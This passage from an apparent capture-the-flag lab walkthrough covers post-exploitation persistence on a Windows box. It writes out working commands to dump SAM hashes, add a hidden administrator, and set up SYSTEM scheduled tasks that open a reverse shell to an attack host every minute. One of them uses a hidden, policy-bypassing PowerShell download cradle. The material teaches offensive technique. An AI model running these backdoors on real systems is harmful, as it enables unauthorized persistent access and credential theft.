-   {{< figure src="/ox-hugo/2025-04-21-162548_.png" >}}


## 4. Persistence: {#4-dot-persistence}


### Dumping SAM Hashes: {#dumping-sam-hashes}

As we already have the Administrator password we can create sessions via `impacket-psexec` anytime we want however we will also dump the SAM hashes too.

-   +Note+: I know this is kind of redundant as if they were to change the administrator password we would still be locked out&#x2026;.

<!--listend-->

```shell
impacket-secretsdump $user:$pass@$box
```

-   {{< figure src="/ox-hugo/2025-04-21-163700_.png" >}}


### Making a new admin user: {#making-a-new-admin-user}

Let's make a new admin user to be safe.

```powershell
#Add the new user
net user bloodstiller bl00dst1ll3r! /add
#Add the user to local admin
net localgroup Administrators bloodstiller /add
```

-   {{< figure src="/ox-hugo/2025-04-21-164132_.png" >}}

Verify it works:

-   {{< figure src="/ox-hugo/2025-04-21-164019_.png" >}}


### Creating a scheduled task: {#creating-a-scheduled-task}

Just to be safe let's create a scheduled task as NT Authority\System to call back out to our attack host periodically.

Why do this, in the event that the administrator changes the password or our new admin user is deleted this will ensure we can still get a high privileged shell. Granted this is very rudimentary means to do so as most people would use a C2 for this.


#### Creating a scheduled task back-door: {#creating-a-scheduled-task-back-door}

A great means of creating persistence is to create a scheduled task that runs periodically and calls back out to our attack machine. I've put two approaches below.


##### Version 1: Using `nc64.exe` to connect back to our attack host periodically: {#version-1-using-nc64-dot-exe-to-connect-back-to-our-attack-host-periodically}

First we need to transfer `nc64.exe` binary over.

We can create the scheduled task backdoor using `schtasks`:

```powershell
schtasks /create /tn BackDoor /tr "C:\Users\Administrator\Documents\nc64.exe  10.10.14.31 6666 -e powershell" /sc minute /mo 1 /ru System
```

-   {{< figure src="/ox-hugo/2025-04-22-071157_.png" >}}
    -   +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to our attack host:

Shell Caught

-   {{< figure src="/ox-hugo/2025-04-22-071316_.png" >}}

Just to double check I disconnect to ensure it calls back out to me:

-   {{< figure src="/ox-hugo/2025-04-22-071334_.png" >}}

<!--list-separator-->

-  Scheduled Task Backdoor Command Breakdown Running a Binary:

    -   **Command Breakdown**:
        -   `schtasks /create`
            -   Creates a new scheduled task on Windows.
        -   `/tn BackDoor`
            -   Sets the task name to `BackDoor`.
            -   This name is how the task will appear in the Task Scheduler.
        -   `/tr "C:\Users\Administrator\Documents\nc64.exe 10.10.14.31 6666 -e powershell"`
            -   Specifies the action that the task will execute.
            -   **Path**: `"C:\Users\Administrator\Documents\nc64.exe"`
                -   Path to `nc64.exe`, used to open a reverse shell.
            -   **IP Address\***: `10.10.14.31`
                -   Our attack machine that is listening where the reverse shell will connect.
            -   **Port**: `6666`
                -   The port number on our attack machine listening for the connection.
            -   **Flag**: `-e powershell`
                -   The `-e` flag executes `powershell.exe` upon connection, providing a command shell.
        -   `/sc minute`
            -   Sets the task's schedule frequency to every minute.
        -   `/mo 1`
            -   Modifier that, when used with `/sc minute`, runs the task every 1 minute.
        -   `/ru System`
            -   Specifies that the task should run with `System` privileges.
            -   Running as `System` grants high privileges, making this backdoor more dangerous.


##### Version 2: Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host: {#version-2-using-a-base64-encoded-powershell-reverse-shell-and-download-cradle-to-connect-back-to-our-attack-host}

So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)

**Create our reverse-shell script**:

We can use a base64 obfuscated powershell reverse shell. I like using <https://revshells.com> for this

**We then need to create our scheduled task**:

```powershell
schtasks /create /tn CradleScript /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.31:7070/script.ps1'''))'" /sc minute /mo 1 /ru System
```

-   {{< figure src="/ox-hugo/2025-04-22-072120_.png" >}}

**Start our listener &amp; webserver**:

-   Webserver:
    -   `python3 -m http.server 7070`
-   Listener:
    -   `rlwrap -cAr nc -nvlp 53`

**The task grabs our script &amp; immediatley executes it in memory**:

-   {{< figure src="/ox-hugo/2025-04-22-072247_.png" >}}

**We get our revere shell**:

-   {{< figure src="/ox-hugo/2025-04-22-072317_.png" >}}

**Double check by disconnecting &amp; seeing if it re-connects and it does**:
  -![](/ox-hugo/2025-04-22-072337_.png)

<!--list-separator-->

-  Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown:

    -   `schtasks /create`
        -   Creates a new scheduled task on Windows.
    -   `/tn CradleScript`
        -   Sets the task name to `CradleScript`.
        -   This name is how the task will appear in the Task Scheduler.
    -   `/tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe`
        -   Specifies the action that the task will execute.
        -   `powershell.exe`: Starts PowerShell.
        -   **Arguments passed to powershell**:
            -   `-WindowStyle hidden`: Runs the task in a hidden window to prevent showing the PowerShell window.
            -   `NoLogo -NonInteractive -ep bypass -nop`: PowerShell flags to suppress output and allow script execution bypassing restrictions.
            -   `IEX ((New-Object Net.WebClient).DownloadString(...))`: Uses `Invoke-Expression` to download and immediately execute the script.
            -   `/sc minute /mo 1`: Sets the task to run every 1 minute.
            -   `/ru System`: Runs the task under `System` privileges.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I got to brush up on my python skills which was nice as I have been looking to getting back into programming more, so to build a decryption script and breakdown what is going on with the exploits was nice to do.
2.  I learned that openfire exists, I didn't even know it existed before this.
3.  I got to brush off the cobwebs, it's been a while since I did a box as I have had a lot of "life" stuff going on so it was good to get back into the groove and grind this box.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Had url encoding on in burpsuite whilst password spraying that cost me time.
2.  Again I didn't have url encoding on when I was manually passing passwords via curl for the openfire exploit. I forgot that the `requests` library would encode the required username and password when passing it, but for some reason forgot I would need to explicitly state this in my manual script. So I was goosed twice by url encoding.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at bloodstiller dot com


